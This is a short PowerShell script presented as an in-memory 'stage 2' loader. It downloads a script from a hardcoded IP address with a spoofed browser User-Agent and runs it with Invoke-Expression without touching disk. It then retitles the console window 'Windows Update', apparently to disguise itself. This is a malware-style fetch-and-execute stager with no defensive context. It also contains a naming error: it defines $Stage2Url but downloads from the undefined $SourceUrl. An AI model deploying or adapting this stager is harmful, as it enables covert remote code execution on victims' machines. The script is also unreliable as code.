<#
.SYNOPSIS
    In-memory stage 2 script loader.

.DESCRIPTION
    Retrieves the stage 2 script as text and invokes it in the
    current session without writing the script to disk.
#>
[CmdletBinding()]
param(
    [string]$Stage2Url = 'http://198.51.100.58/stage2.ps1',
    [int]$TransferTimeout = 30
)
$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ClientObject = New-Object System.Net.WebClient
$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$RemoteScript = $ClientObject.DownloadString($SourceUrl)
if ([string]::IsNullOrWhiteSpace($RemoteScript)) {
    throw "Downloaded script was empty"
}
Write-Verbose ("Script length: " + $RemoteScript.Length)
Invoke-Expression $RemoteScript

Write-Verbose "stage marker 21 reached"
$Host.UI.RawUI.WindowTitle = "Windows Update"
$ProgressPreference = "SilentlyContinue"
